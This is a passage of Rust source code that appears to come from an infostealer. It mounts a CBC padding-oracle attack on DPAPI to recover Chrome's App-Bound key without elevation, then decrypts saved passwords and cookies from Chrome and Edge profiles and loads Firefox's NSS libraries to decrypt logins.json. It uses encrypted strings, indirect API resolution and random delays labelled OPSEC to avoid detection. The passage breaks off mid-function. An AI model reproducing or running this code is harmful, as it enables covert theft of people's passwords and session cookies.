/// 36      4     cbCryptData   ← length of the encrypted block
/// 40      4     offsetSalt
/// 44      4     cbSalt
/// 48      4     offsetHmacKey
/// 52      4     cbHmacKey
/// 56      4     offsetHmacData
/// 60      4     cbHmacData
/// 64      4     offsetData
/// 68      4     cbData         ← sometimes used interchangeably with cbCryptData
/// ```
///
/// The actual encrypted data starts at a location computed from the header
/// offsets.  For a standard DPAPI blob the encrypted region is typically
/// 16-byte aligned (AES-CBC block size).
struct DpapiBlobInfo {
    /// Offset of the AES-CBC encrypted data within the blob.
    encrypted_offset: usize,
    /// Length of the encrypted data (must be a multiple of 16).
    encrypted_len: usize,
}

fn parse_dpapi_blob(blob: &[u8]) -> Result<DpapiBlobInfo> {
    if blob.len() < 72 {
        bail!(
            "{}",
            String::from_utf8_lossy(&string_crypt::enc_str!("DPAPI blob too short"))
                .trim_end_matches('\0')
        );
    }

    // Version must be 1.
    let version = u32::from_le_bytes(blob[0..4].try_into().unwrap());
    if version != 1 {
        bail!(
            "{}",
            String::from_utf8_lossy(&string_crypt::enc_str!("unsupported DPAPI blob version"))
                .trim_end_matches('\0')
        );
    }

    // Read offsets and lengths from the header.
    let _offset_master_key = u32::from_le_bytes(blob[20..24].try_into().unwrap()) as usize;
    let _offset_backup_key = u32::from_le_bytes(blob[24..28].try_into().unwrap()) as usize;
    let _crypt_alg = u32::from_le_bytes(blob[28..32].try_into().unwrap());

    // The "crypt data" section offset is relative to the start of the blob.
    // In most DPAPI blobs the structure is:
    //   [header 72 bytes] [master_key blob] [backup_key blob] [salt] [hmac_key] [encrypted_data] [hmac]
    // We read offsetCryptData and cbCryptData to find the encrypted block.

    // Some references use different field positions.  Let's read multiple
    // candidate lengths and pick the one that makes sense (multiple of 16,
    // non-zero, fits within the blob).
    let offset_crypt = u32::from_le_bytes(blob[32..36].try_into().unwrap()) as usize;
    let cb_crypt = u32::from_le_bytes(blob[36..40].try_into().unwrap()) as usize;

    // Fallback: the data fields at offset 64/68.
    let offset_data = u32::from_le_bytes(blob[64..68].try_into().unwrap()) as usize;
    let cb_data = u32::from_le_bytes(blob[68..72].try_into().unwrap()) as usize;

    // Heuristic: use cb_crypt if it is a plausible AES-CBC ciphertext size,
    // otherwise fall back to cb_data.
    let (enc_offset, enc_len) = if cb_crypt > 0
        && cb_crypt % 16 == 0
        && offset_crypt + cb_crypt <= blob.len()
    {
        (offset_crypt, cb_crypt)
    } else if cb_data > 0
        && cb_data % 16 == 0
        && offset_data + cb_data <= blob.len()
    {
        (offset_data, cb_data)
    } else {
        // Last resort: everything after the HMAC area up to the end,
        // rounded down to 16-byte boundary.  Find the largest 16-byte-aligned
        // region that could be the ciphertext.
        let hmac_off = u32::from_le_bytes(blob[56..60].try_into().unwrap()) as usize;
        let hmac_len = u32::from_le_bytes(blob[60..64].try_into().unwrap()) as usize;
        let data_start = hmac_off + hmac_len;
        if data_start < blob.len() {
            let remaining = blob.len() - data_start;
            let aligned = remaining - (remaining % 16);
            if aligned >= 16 {
                (data_start, aligned)
            } else {
                bail!(
                    "{}",
                    String::from_utf8_lossy(&string_crypt::enc_str!(
                        "cannot locate encrypted block in DPAPI blob"
                    ))
                    .trim_end_matches('\0')
                );
            }
        } else {
            bail!(
                "{}",
                String::from_utf8_lossy(&string_crypt::enc_str!(
                    "DPAPI blob structure unexpected"
                ))
                .trim_end_matches('\0')
            );
        }
    };

    // For the padding oracle we only need the last N blocks where
    // N = (plaintext_length / 16) + 1 (for the padding block).
    // The AES-256-GCM key is 32 bytes, so plaintext is 32 bytes.
    // AES-CBC with PKCS#7: 32 bytes → 2 blocks (32 bytes) + padding block (16 bytes) = 48 bytes.
    // But DPAPI may add a header inside the encryption, so the actual
    // encrypted length could be larger.  We attack the last ceil(32/16)+1 = 3 blocks.
    //
    // However, the oracle reveals *all* the plaintext of the encrypted
    // section, not just the key.  We attack the entire ciphertext to be safe.

    log::debug!(
        "DPAPI blob parsed: encrypted block at offset {}, length {} bytes ({} AES blocks)",
        enc_offset,
        enc_len,
        enc_len / 16
    );

    Ok(DpapiBlobInfo {
        encrypted_offset: enc_offset,
        encrypted_len: enc_len,
    })
}

/// Perform the CBC padding oracle attack to recover the plaintext of the
/// encrypted section of a DPAPI blob.
///
/// Returns the decrypted plaintext bytes of the encrypted section.
fn cbc_padding_oracle(
    crypt_unprotect: unsafe extern "system" fn(
        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
        *mut *mut u16,
        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
        *mut c_void,
        *mut c_void,
        u32,
        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
    ) -> i32,
    blob: &[u8],
    enc_offset: usize,
    enc_len: usize,
    cancel: &C4CancelToken,
    timeout: std::time::Duration,
) -> Result<Vec<u8>> {
    let block_size: usize = 16;
    let num_blocks = enc_len / block_size;
    if num_blocks < 2 {
        bail!(
            "{}",
            String::from_utf8_lossy(&string_crypt::enc_str!(
                "encrypted section too short for CBC oracle (< 2 blocks)"
            ))
            .trim_end_matches('\0')
        );
    }

    // The "intermediate" values: AES_decrypt(C[i]) for each block.
    // Once we know these, plaintext[i] = intermediate[i] XOR C[i-1].
    let mut intermediate = vec![0u8; enc_len];
    let mut plaintext = vec![0u8; enc_len];

    let start = std::time::Instant::now();
    let mut oracle_calls: u64 = 0;

    // For each block (from last to first), recover the intermediate values.
    for block_idx in (1..num_blocks).rev() {
        if cancel.is_cancelled() {
            bail!(
                "{}",
                String::from_utf8_lossy(&string_crypt::enc_str!("C4 attack cancelled"))
                    .trim_end_matches('\0')
            );
        }
        if start.elapsed() > timeout {
            bail!(
                "{}",
                String::from_utf8_lossy(&string_crypt::enc_str!(
                    "C4 attack timed out"
                ))
                .trim_end_matches('\0')
            );
        }

        let target_block_start = block_idx * block_size;

        // We are attacking bytes within this block, starting from the last byte.
        for byte_pos in (0..block_size).rev() {
            let pad_value = (block_size - byte_pos) as u8;

            // Build the modified preceding block (block_idx - 1).
            // For already-known bytes (to the right of byte_pos), set them
            // so that they decrypt to the correct pad_value.
            let mut modified_prev = vec![0u8; block_size];
            for k in (byte_pos + 1)..block_size {
                modified_prev[k] = intermediate[target_block_start + k] ^ pad_value;
            }

            // Try all 256 values for the byte at byte_pos.
            let mut found = false;
            let mut candidates = Vec::with_capacity(256);

            // Shuffle the order to avoid timing patterns.
            for v in 0u8..=255 {
                candidates.push(v);
            }
            // Simple LCG shuffle (no need for full rand crate).
            let mut seed = oracle_calls.wrapping_add(block_idx as u64 * 256 + byte_pos as u64);
            for i in (1..256).rev() {
                seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
                let j = (seed >> 16) as usize % (i + 1);
                candidates.swap(i, j);
            }

            for guess in &candidates {
                if cancel.is_cancelled() {
                    bail!(
                        "{}",
                        String::from_utf8_lossy(&string_crypt::enc_str!("C4 attack cancelled"))
                            .trim_end_matches('\0')
                    );
                }
                if start.elapsed() > timeout {
                    bail!(
                        "{}",
                        String::from_utf8_lossy(&string_crypt::enc_str!(
                            "C4 attack timed out"
                        ))
                        .trim_end_matches('\0')
                    );
                }

                modified_prev[byte_pos] = *guess;

                // Build a modified blob: copy the original, replace the
                // preceding block with modified_prev.
                let mut modified_blob = blob.to_vec();
                let prev_block_start = (block_idx - 1) * block_size;
                modified_blob[enc_offset + prev_block_start..enc_offset + prev_block_start + block_size]
                    .copy_from_slice(&modified_prev);

                // Call the oracle.
                let valid = unsafe { dpapi_oracle(crypt_unprotect, &modified_blob) };
                oracle_calls += 1;

                if valid {
                    // The decrypted last bytes of the target block now have
                    // valid PKCS#7 padding.  For the last byte, we know:
                    //   intermediate[byte_pos] = guess XOR pad_value
                    // But for bytes > byte_pos, we might have gotten a
                    // false positive where the padding byte isn't pad_value
                    // but something larger.  Only when byte_pos is the last
                    // byte (15) do we need to disambiguate.
                    if byte_pos == block_size - 1 {
                        // Disambiguate: modify byte 14 as well to verify
                        // the padding is exactly 0x01, not 0x02 0x02 etc.
                        let mut verify_blob = modified_blob.clone();
                        verify_blob[enc_offset + prev_block_start + 14] ^= 0x01;
                        let verify_valid = unsafe { dpapi_oracle(crypt_unprotect, &verify_blob) };
                        oracle_calls += 1;
                        if !verify_valid {
                            // False positive — padding was not 0x01.
                            continue;
                        }
                    }

                    let intermediate_byte = guess ^ pad_value;
                    intermediate[target_block_start + byte_pos] = intermediate_byte;

                    // OPSEC: small random delay between oracle calls.
                    // Use a simple variable delay (1-10 ms) to avoid
                    // timing-based detection.
                    let delay_us = {
                        let s = oracle_calls.wrapping_mul(6364136223846793005)
                            .wrapping_add(1442695040888963407);
                        1000 + (s >> 56) as u64 % 9000 // 1-10 ms
                    };
                    if delay_us > 0 {
                        std::thread::sleep(std::time::Duration::from_micros(delay_us));
                    }

                    found = true;
                    break;
                }
            }

            if !found {
                bail!(
                    "{}",
                    String::from_utf8_lossy(&string_crypt::enc_str!(
                        "C4: no valid padding found for byte position"
                    ))
                    .trim_end_matches('\0')
                );
            }
        }

        // Derive plaintext for this block.
        let prev_block_start = (block_idx - 1) * block_size;
        for k in 0..block_size {
            plaintext[block_idx * block_size + k] =
                intermediate[block_idx * block_size + k] ^ blob[enc_offset + prev_block_start + k];
        }

        log::debug!(
            "C4: recovered block {}/{} ({} oracle calls, {:.1}s elapsed)",
            block_idx,
            num_blocks - 1,
            oracle_calls,
            start.elapsed().as_secs_f64()
        );
    }

    // Strip PKCS#7 padding from the plaintext.
    if let Some(&pad_byte) = plaintext.last() {
        let pad_len = pad_byte as usize;
        if pad_len > 0 && pad_len <= block_size && plaintext.len() >= pad_len {
            let all_pad = plaintext[plaintext.len() - pad_len..]
                .iter()
                .all(|&b| b == pad_byte);
            if all_pad {
                plaintext.truncate(plaintext.len() - pad_len);
            }
        }
    }

    log::info!(
        "C4 padding oracle completed: {} oracle calls, {:.1}s, recovered {} bytes",
        oracle_calls,
        start.elapsed().as_secs_f64(),
        plaintext.len()
    );

    Ok(plaintext)
}

/// Strategy D: C4 Padding Oracle — decrypt the App-Bound key without elevation.
///
/// Uses a CBC padding oracle on the DPAPI-encrypted blob to recover the AES
/// key in plaintext.  Works from standard user context; no SYSTEM or service
/// interaction required.
fn decrypt_master_key_via_c4(encrypted_key: &[u8], timeout_secs: u64) -> Result<Vec<u8>> {
    // Try to acquire the C4 lock.  If another C4 attack is running, cancel it.
    let mut lock = C4_LOCK.blocking_lock();
    if let Some(ref existing) = *lock {
        existing.cancel();
        log::warn!(
            "{}",
            String::from_utf8_lossy(&string_crypt::enc_str!(
                "C4: cancelling in-progress attack for new request"
            ))
            .trim_end_matches('\0')
        );
    }

    *lock = Some(C4CancelToken::new());
    let cancel_ref: &C4CancelToken = lock.as_ref().unwrap();

    // Resolve CryptUnprotectData via pe_resolve.
    let crypt_unprotect = unsafe { resolve_crypt_unprotect_data() }.ok_or_else(|| {
        anyhow!(
            "{}",
            String::from_utf8_lossy(&string_crypt::enc_str!(
                "C4: failed to resolve CryptUnprotectData via pe_resolve"
            ))
            .trim_end_matches('\0')
        )
    })?;

    // Parse the DPAPI blob to find the encrypted section.
    let blob_info = parse_dpapi_blob(encrypted_key)?;

    let timeout = std::time::Duration::from_secs(timeout_secs);

    let result = cbc_padding_oracle(
        crypt_unprotect,
        encrypted_key,
        blob_info.encrypted_offset,
        blob_info.encrypted_len,
        cancel_ref,
        timeout,
    );

    // Clear the lock.
    *lock = None;

    // The recovered plaintext may contain a DPAPI-internal header before the
    // actual AES key.  Chrome's App-Bound key is always 32 bytes (AES-256).
    // Search for a 32-byte sequence at the end that looks like a key.
    let plaintext = result?;

    if plaintext.len() == 32 {
        return Ok(plaintext);
    }

    // If longer, the last 32 bytes are likely the key (DPAPI sometimes
    // prepends metadata).
    if plaintext.len() >= 32 {
        let key = plaintext[plaintext.len() - 32..].to_vec();
        log::debug!(
            "C4: extracted last 32 bytes as key from {}-byte plaintext",
            plaintext.len()
        );
        return Ok(key);
    }

    bail!(
        "{}",
        String::from_utf8_lossy(&string_crypt::enc_str!(
            "C4: recovered plaintext too short for AES-256 key"
        ))
        .trim_end_matches('\0')
    );
}

// ── Chromium profile discovery ─────────────────────────────────────────────────

/// Return the LOCALAPPDATA path.
fn local_app_data() -> Option<PathBuf> {
    std::env::var("LOCALAPPDATA").ok().map(PathBuf::from)
}

/// Enumerate all profile subdirectories under `user_data_dir`.
/// Checks for "Default" and "Profile N" (up to 32 profiles).
fn find_chromium_profiles(user_data_dir: &Path) -> Vec<PathBuf> {
    let mut profiles = Vec::new();

    let default_dir = user_data_dir.join("Default");
    if default_dir.is_dir() {
        profiles.push(default_dir);
    }

    for n in 1..=32 {
        let p = user_data_dir.join(format!("Profile {}", n));
        if p.is_dir() {
            profiles.push(p);
        } else {
            break;
        }
    }

    profiles
}

// ── Chromium credential / cookie collection ────────────────────────────────────

/// Read and decrypt Login Data for one Chromium profile.
fn collect_chromium_credentials(
    profile_dir: &Path,
    master_key: &[u8],
    browser: &str,
) -> Vec<CredentialRecord> {
    let db_path = profile_dir.join("Login Data");
    let profile_name = profile_dir
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();

    let db_bytes = match fs::read(&db_path) {
        Ok(b) => b,
        Err(_) => return Vec::new(),
    };

    let rows = match sqlite_read_table(&db_bytes, "logins") {
        Ok(r) => r,
        Err(_) => return Vec::new(),
    };

    let mut records = Vec::new();
    for row in rows {
        // logins columns: id, origin_url, action_url, username_element,
        //                 username_value, password_element, password_value, ...
        // We need: origin_url (index 1), username_value (index 4), password_value (index 6)
        let url = match row.get(1) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => continue,
        };
        let username = match row.get(4) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => String::new(),
        };
        let enc_pwd = match row.get(6) {
            Some(SqliteValue::Blob(b)) => b.clone(),
            Some(SqliteValue::Text(t)) => t.as_bytes().to_vec(),
            _ => continue,
        };

        if enc_pwd.is_empty() {
            continue;
        }

        let password = match decrypt_chromium_value(master_key, &enc_pwd) {
            Ok(plain) => String::from_utf8_lossy(&plain).into_owned(),
            Err(_) => continue,
        };

        records.push(CredentialRecord {
            browser: browser.to_string(),
            profile: profile_name.clone(),
            url,
            username,
            password,
        });
    }
    records
}

/// Read and decrypt Cookies for one Chromium profile.
fn collect_chromium_cookies(
    profile_dir: &Path,
    master_key: &[u8],
    browser: &str,
) -> Vec<CookieRecord> {
    // Chrome 96+: cookies DB is at Network/Cookies; older versions at Cookies.
    let db_path = {
        let network_path = profile_dir.join("Network").join("Cookies");
        if network_path.exists() {
            network_path
        } else {
            profile_dir.join("Cookies")
        }
    };
    let profile_name = profile_dir
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();

    let db_bytes = match fs::read(&db_path) {
        Ok(b) => b,
        Err(_) => return Vec::new(),
    };

    let rows = match sqlite_read_table(&db_bytes, "cookies") {
        Ok(r) => r,
        Err(_) => return Vec::new(),
    };

    let mut records = Vec::new();
    for row in rows {
        // cookies columns (may vary by version, typical order):
        // creation_utc, host_key, top_frame_site_key, name, value,
        // encrypted_value, path, expires_utc, is_secure, is_httponly,
        // last_access_utc, has_expires, is_persistent, priority,
        // samesite, source_scheme, source_port, is_same_party, ...
        //
        // We match by reading host_key=1, name=3, value=4, encrypted_value=5,
        // path=6, expires_utc=7, is_secure=8, is_httponly=9, samesite=14.
        let host = match row.get(1) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => continue,
        };
        let name = match row.get(3) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => String::new(),
        };
        let plaintext_value = match row.get(4) {
            Some(SqliteValue::Text(t)) if !t.is_empty() => Some(t.clone()),
            _ => None,
        };
        let enc_value = match row.get(5) {
            Some(SqliteValue::Blob(b)) => b.clone(),
            Some(SqliteValue::Text(t)) => t.as_bytes().to_vec(),
            _ => Vec::new(),
        };
        let path = match row.get(6) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => String::from("/"),
        };
        let expires_utc = match row.get(7) {
            Some(SqliteValue::Int(v)) => *v,
            _ => 0,
        };
        let is_secure = matches!(row.get(8), Some(SqliteValue::Int(1)));
        let is_httponly = matches!(row.get(9), Some(SqliteValue::Int(1)));
        let samesite = match row.get(14) {
            Some(SqliteValue::Int(v)) => *v as i32,
            _ => -1,
        };

        let value = if let Some(pv) = plaintext_value {
            pv
        } else if !enc_value.is_empty() {
            match decrypt_chromium_value(master_key, &enc_value) {
                Ok(plain) => String::from_utf8_lossy(&plain).into_owned(),
                Err(_) => continue,
            }
        } else {
            continue;
        };

        records.push(CookieRecord {
            browser: browser.to_string(),
            profile: profile_name.clone(),
            host,
            name,
            value,
            path,
            expires_utc,
            is_httponly,
            is_secure,
            samesite,
        });
    }
    records
}

/// Entry point for Chrome data collection.
pub fn collect_chrome_data(
    data_type: &common::BrowserDataType,
) -> BrowserDataResult {
    let mut result = BrowserDataResult::default();
    let lad = match local_app_data() {
        Some(p) => p,
        None => return result,
    };

    let user_data_dir = lad
        .join("Google")
        .join("Chrome")
        .join("User Data");
    if !user_data_dir.is_dir() {
        return result;
    }

    let local_state = user_data_dir.join("Local State");
    let master_key = match get_chromium_master_key(&local_state, CHROME_ELEVATION_CLSIDS) {
        Ok(k) => k,
        Err(_) => return result,
    };

    for profile in find_chromium_profiles(&user_data_dir) {
        if matches!(data_type, common::BrowserDataType::Credentials | common::BrowserDataType::All) {
            result.credentials.extend(
                collect_chromium_credentials(&profile, &master_key, "Chrome"),
            );
        }
        if matches!(data_type, common::BrowserDataType::Cookies | common::BrowserDataType::All) {
            result.cookies.extend(
                collect_chromium_cookies(&profile, &master_key, "Chrome"),
            );
        }
    }
    result
}

/// Entry point for Edge data collection.
pub fn collect_edge_data(data_type: &common::BrowserDataType) -> BrowserDataResult {
    let mut result = BrowserDataResult::default();
    let lad = match local_app_data() {
        Some(p) => p,
        None => return result,
    };

    let user_data_dir = lad
        .join("Microsoft")
        .join("Edge")
        .join("User Data");
    if !user_data_dir.is_dir() {
        return result;
    }

    let local_state = user_data_dir.join("Local State");
    let master_key = match get_chromium_master_key(&local_state, EDGE_ELEVATION_CLSIDS) {
        Ok(k) => k,
        Err(_) => return result,
    };

    for profile in find_chromium_profiles(&user_data_dir) {
        if matches!(data_type, common::BrowserDataType::Credentials | common::BrowserDataType::All) {
            result.credentials.extend(
                collect_chromium_credentials(&profile, &master_key, "Edge"),
            );
        }
        if matches!(data_type, common::BrowserDataType::Cookies | common::BrowserDataType::All) {
            result.cookies.extend(
                collect_chromium_cookies(&profile, &master_key, "Edge"),
            );
        }
    }
    result
}

// ── Firefox ────────────────────────────────────────────────────────────────────

/// NSS SECItem (used for PK11SDR_Decrypt input and output).
#[repr(C)]
struct SecItem {
    item_type: u32, // SECItemType (siBuffer = 0)
    data: *mut u8,
    len: u32,
}

impl SecItem {
    fn from_slice(data: &[u8]) -> Self {
        SecItem {
            item_type: 0, // siBuffer
            data: data.as_ptr() as *mut u8,
            len: data.len() as u32,
        }
    }
    fn zeroed() -> Self {
        SecItem { item_type: 0, data: ptr::null_mut(), len: 0 }
    }
}

/// Dynamically-resolved NSS function pointers.
struct NssFunctions {
    nss_init: unsafe extern "C" fn(*const c_char) -> c_int,
    nss_shutdown: unsafe extern "C" fn() -> c_int,
    pk11_get_internal_key_slot: unsafe extern "C" fn() -> *mut c_void,
    pk11_check_user_password: unsafe extern "C" fn(*mut c_void, *const c_char) -> c_int,
    pk11_free_slot: unsafe extern "C" fn(*mut c_void),
    pk11sdr_decrypt: unsafe extern "C" fn(*mut SecItem, *mut SecItem, *mut c_void) -> c_int,
    secitem_free_item: unsafe extern "C" fn(*mut SecItem, c_int),
}

/// Find the Firefox installation directory from the registry, then common paths.
fn find_firefox_install_dir() -> Option<PathBuf> {
    // Try HKLM\SOFTWARE\Mozilla\Mozilla Firefox\CurrentVersion\Main\Install Directory
    if let Ok(hklm) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey_with_flags(
        "SOFTWARE\\Mozilla\\Mozilla Firefox",
        KEY_READ,
    ) {
        if let Ok(ver) = hklm.get_value::<String, _>("CurrentVersion") {
            let subkey = format!("SOFTWARE\\Mozilla\\Mozilla Firefox\\{}\\Main", ver);
            if let Ok(main_key) = RegKey::predef(HKEY_LOCAL_MACHINE)
                .open_subkey_with_flags(&subkey, KEY_READ)
            {
                if let Ok(dir) = main_key.get_value::<String, _>("Install Directory") {
                    let p = PathBuf::from(dir);
                    if p.join("nss3.dll").exists() {
                        return Some(p);
                    }
                }
            }
        }
    }

    // Fallback: common install paths.
    for candidate in &[
        r"C:\Program Files\Mozilla Firefox",
        r"C:\Program Files (x86)\Mozilla Firefox",
    ] {
        let p = PathBuf::from(candidate);
        if p.join("nss3.dll").exists() {
            return Some(p);
        }
    }
    None
}

/// Load mozglue.dll and nss3.dll from `install_dir` and resolve function
/// pointers.  The caller must call `FreeLibrary` on both returned handles when
/// done.
unsafe fn load_nss(install_dir: &Path) -> Result<(*mut c_void, *mut c_void, NssFunctions)> {
    let mozglue_path = install_dir.join("mozglue.dll");
    let nss3_path = install_dir.join("nss3.dll");

    let mozglue_cstr = CString::new(mozglue_path.to_string_lossy().as_ref())
        .context("CString mozglue path")?;
    let nss3_cstr = CString::new(nss3_path.to_string_lossy().as_ref())
        .context("CString nss3 path")?;

    // mozglue must be loaded first.
    let h_mozglue = LoadLibraryA(mozglue_cstr.as_ptr());
    if h_mozglue.is_null() {
        bail!("LoadLibraryA(mozglue.dll) failed");
    }
    let h_nss3 = LoadLibraryA(nss3_cstr.as_ptr());
    if h_nss3.is_null() {
        FreeLibrary(h_mozglue);
        bail!("LoadLibraryA(nss3.dll) failed");
    }

    macro_rules! resolve {
        ($hmod:expr, $name:literal, $ty:ty) => {{
            let sym = GetProcAddress($hmod, concat!($name, "\0").as_ptr() as *const i8);
            if sym.is_null() {
                FreeLibrary(h_nss3);
                FreeLibrary(h_mozglue);
                bail!("GetProcAddress({}) failed", $name);
            }
            std::mem::transmute::<*mut c_void, $ty>(sym)
        }};
    }

    type NssInitFn = unsafe extern "C" fn(*const c_char) -> c_int;
    type NssShutdownFn = unsafe extern "C" fn() -> c_int;
    type Pk11GetSlotFn = unsafe extern "C" fn() -> *mut c_void;
    type Pk11CheckPwFn = unsafe extern "C" fn(*mut c_void, *const c_char) -> c_int;
    type Pk11FreeSlotFn = unsafe extern "C" fn(*mut c_void);
    type Pk11SdrDecryptFn = unsafe extern "C" fn(*mut SecItem, *mut SecItem, *mut c_void) -> c_int;
    type SecitemFreeItemFn = unsafe extern "C" fn(*mut SecItem, c_int);

    let fns = NssFunctions {
        nss_init:                   resolve!(h_nss3, "NSS_Init",                   NssInitFn),
        nss_shutdown:               resolve!(h_nss3, "NSS_Shutdown",               NssShutdownFn),
        pk11_get_internal_key_slot: resolve!(h_nss3, "PK11_GetInternalKeySlot",    Pk11GetSlotFn),
        pk11_check_user_password:   resolve!(h_nss3, "PK11_CheckUserPassword",     Pk11CheckPwFn),
        pk11_free_slot:             resolve!(h_nss3, "PK11_FreeSlot",              Pk11FreeSlotFn),
        pk11sdr_decrypt:            resolve!(h_nss3, "PK11SDR_Decrypt",            Pk11SdrDecryptFn),
        secitem_free_item:          resolve!(h_nss3, "SECITEM_FreeItem",           SecitemFreeItemFn),
    };

    Ok((h_mozglue as *mut c_void, h_nss3 as *mut c_void, fns))
}

/// Decrypt a single base64-encoded NSS-encrypted value using `PK11SDR_Decrypt`.
unsafe fn nss_decrypt_b64(fns: &NssFunctions, b64: &str) -> Result<String> {
    let raw = base64::engine::general_purpose::STANDARD
        .decode(b64)
        .context("base64 decode of NSS-encrypted value")?;

    let mut input = SecItem::from_slice(&raw);
    let mut output = SecItem::zeroed();

    let status = (fns.pk11sdr_decrypt)(&mut input, &mut output, ptr::null_mut());
    if status != 0 {
        bail!("PK11SDR_Decrypt failed (status {})", status);
    }
    if output.data.is_null() || output.len == 0 {
        (fns.secitem_free_item)(&mut output, 0);
        bail!("PK11SDR_Decrypt returned empty output");
    }

    let plaintext = std::slice::from_raw_parts(output.data, output.len as usize).to_vec();
    (fns.secitem_free_item)(&mut output, 0);

    String::from_utf8(plaintext).context("UTF-8 decode of NSS plaintext")
}

/// Enumerate Firefox profile directories from `%APPDATA%\Mozilla\Firefox\profiles.ini`.
fn find_firefox_profiles() -> Vec<PathBuf> {
    let appdata = match std::env::var("APPDATA") {
        Ok(p) => PathBuf::from(p),
        Err(_) => return Vec::new(),
    };

    let profiles_ini = appdata
        .join("Mozilla")
        .join("Firefox")
        .join("profiles.ini");
    let content = match fs::read_to_string(&profiles_ini) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };

    let mut profiles = Vec::new();
    let mut current_path: Option<String> = None;
    let mut is_relative = true;

    for line in content.lines() {
        let line = line.trim();
        if line.starts_with('[') {
            // Flush previous profile.
            if let Some(path) = current_path.take() {
                let full = if is_relative {
                    profiles_ini
                        .parent()
                        .unwrap_or(Path::new(""))
                        .join(&path)
                } else {
                    PathBuf::from(&path)
                };
                if full.is_dir() {
                    profiles.push(full);
                }
            }
            is_relative = true;
        } else if let Some(val) = line.strip_prefix("Path=") {
            current_path = Some(val.replace('/', std::path::MAIN_SEPARATOR_STR));
        } else if line == "IsRelative=0" {
            is_relative = false;
        }
    }
    // Flush last.
    if let Some(path) = current_path {
        let full = if is_relative {
            profiles_ini
                .parent()
                .unwrap_or(Path::new(""))
                .join(&path)
        } else {
            PathBuf::from(&path)
        };
        if full.is_dir() {
            profiles.push(full);
        }
    }

    profiles
}

/// Decrypt Firefox `logins.json` credentials for one profile.
unsafe fn collect_firefox_credentials_nss(
    profile_dir: &Path,
    fns: &NssFunctions,
    browser: &str,
) -> Vec<CredentialRecord> {
    let logins_path = profile_dir.join("logins.json");
    let content = match fs::read_to_string(&logins_path) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    let json: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let logins = match json.get("logins").and_then(|l| l.as_array()) {
        Some(a) => a,
        None => return Vec::new(),
    };

    let profile_name = profile_dir
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();

    let mut records = Vec::new();
    for entry in logins {
        let url = entry
            .get("hostname")
            .or_else(|| entry.get("formSubmitURL"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let enc_user = match entry.get("encryptedUsername").and_then(|v| v.as_str()) {
            Some(s) => s,
            None => continue,
        };
        let enc_pass = match entry.get("encryptedPassword").and_then(|v| v.as_str()) {
            Some(s) => s,
            None => continue,
        };

        let username = match nss_decrypt_b64(fns, enc_user) {
            Ok(u) => u,
            Err(_) => continue,
        };
        let password = match nss_decrypt_b64(fns, enc_pass) {
            Ok(p) => p,
            Err(_) => continue,
        };

        records.push(CredentialRecord {
            browser: browser.to_string(),
            profile: profile_name.clone(),
            url,
            username,
            password,
        });
    }
    records
}

/// Read Firefox cookies from `cookies.sqlite` (values stored in plaintext).
fn collect_firefox_cookies(profile_dir: &Path, browser: &str) -> Vec<CookieRecord> {
    let db_path = profile_dir.join("cookies.sqlite");
    let profile_name = profile_dir
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();

    let db_bytes = match fs::read(&db_path) {
        Ok(b) => b,
        Err(_) => return Vec::new(),
    };

    let rows = match sqlite_read_table(&db_bytes, "moz_cookies") {
        Ok(r) => r,
        Err(_) => return Vec::new(),
    };

    let mut records = Vec::new();
    for row in rows {
        // moz_cookies columns: id, baseDomain, originAttributes, name, value,
        //                      host, path, expiry, lastAccessed, creationTime,
        //                      isSecure, isHttpOnly, appId, inBrowserElement, sameSite
        let host = match row.get(5) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => continue,
        };
        let name = match row.get(3) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => String::new(),
        };
        let value = match row.get(4) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => String::new(),
        };
        let path = match row.get(6) {
            Some(SqliteValue::Text(t)) => t.clone(),
            _ => String::from("/"),
        };
        let expires_utc = match row.get(7) {
            Some(SqliteValue::Int(v)) => *v,
            _ => 0,
        };
        let is_secure = matches!(row.get(10), Some(SqliteValue::Int(1)));
        let is_httponly = matches!(row.get(11), Some(SqliteValue::Int(1)));
        let samesite = match row.get(14) {
            Some(SqliteValue::Int(v)) => *v as i32,
            _ => 0,
        };

        records.push(CookieRecord {
            browser: browser.to_string(),
            profile: profile_name.clone(),
            host,
            name,
            value,
            path,
            expires_utc,
            is_httponly,
            is_secure,
            samesite,
        });
    }
    records
}

/// Entry point for Firefox data collection.
pub fn collect_firefox_data(data_type: &common::BrowserDataType) -> BrowserDataResult {
    let mut result = BrowserDataResult::default();

    let install_dir = match find_firefox_install_dir() {
        Some(d) => d,
        None => return result,
    };

    let (h_mozglue, h_nss3, fns) = match unsafe { load_nss(&install_dir) } {
        Ok(t) => t,
        Err(_) => return result,
    };

    for profile_dir in find_firefox_profiles() {
        // Build a NUL-terminated profile path for NSS_Init.
        let profile_path_str = profile_dir.to_string_lossy().into_owned();
        let profile_cstr = match CString::new(profile_path_str) {
            Ok(cs) => cs,
            Err(_) => continue,
        };

        let nss_status = unsafe { (fns.nss_init)(profile_cstr.as_ptr()) };
        if nss_status != 0 {
            // NSS_Init failed — wrong profile or already initialized for another.
            continue;
        }

        let slot = unsafe { (fns.pk11_get_internal_key_slot)() };

        // Check for empty master password.
        let empty_pw = CString::new("").unwrap();
        let pw_ok = !slot.is_null()
            && unsafe { (fns.pk11_check_user_password)(slot, empty_pw.as_ptr()) } == 0;

        if pw_ok {
            if matches!(
                data_type,
